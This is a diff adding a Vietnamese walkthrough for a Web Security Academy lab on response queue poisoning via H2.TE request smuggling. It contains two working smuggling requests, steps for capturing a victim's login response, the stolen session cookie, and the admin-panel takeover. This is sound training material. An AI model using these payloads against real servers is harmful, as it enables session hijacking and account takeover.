@@ -393,6 +393,45 @@ x=
 Sau khi submit request trên, smuggled request sẽ là `GET /post?postId=7` với header User-Agent bị thay đổi để exploit reflected XSS. Kết quả, bài lab được giải thành công.
 
 # 11. Response queue poisoning via H2.TE request smuggling
+Cấu hình request:
+```
+POST / HTTP/2
+Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 113
+
+0
+
+GET /404 HTTP/1.1
+Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
+Content-Length: 5
+
+x=1
+```
+Sau khi submit hai lần, response trả về `HTTP/2 404 Not Found`. Như vậy, website có lỗ hổng H2.TE.
+
+Tiếp tục, ta cấu hình request sau:
+```
+POST / HTTP/2
+Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 101
+
+0
+
+GET /post?postId=2 HTTP/1.1
+Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
+
+
+```
+Request trên sẽ được back-end server xử lý như hai request: `POST /` và `GET /post?postId=2`. Quá trình exploit như sau:
+1) Submit request, respose của `POST /` được trả về và response của `GET /post?postId=2` được đặt ở vị trí đầu tiên trong response queue
+2) Khi victim login, trong response trả về sẽ có header `Set-Cookie` với session mới của victim. Tuy nhiên, response trả về cho victim sẽ là response của `GET /post?postId=2`, do nó nằm ở vị trí đầu trong queue. Sau đó, response cho request logic của victim được đẩy lên đầu response queue.
+3) Gửi lại request một lần nữa, ta nhận được response cho request login của victim. Do đó, thay vì nhận được response của `POST /`, ta sẽ nhận được response có chứa session mới của victim sau khi login.
+
+![image](https://user-images.githubusercontent.com/103978452/226150791-5e411eb8-0071-4117-9f67-4fef56c2dd77.png)
+
+Ta thu được `session=yOLaDKQeiNN0jKkPQcPmaQXuQAtNfVKC`. Thay thế với session hiện tại, access vào admin panel và xóa user carlos. Kết quả, bài lab được giải thành công.
 
 # 12. H2.CL request smuggling
 Cấu hình request:
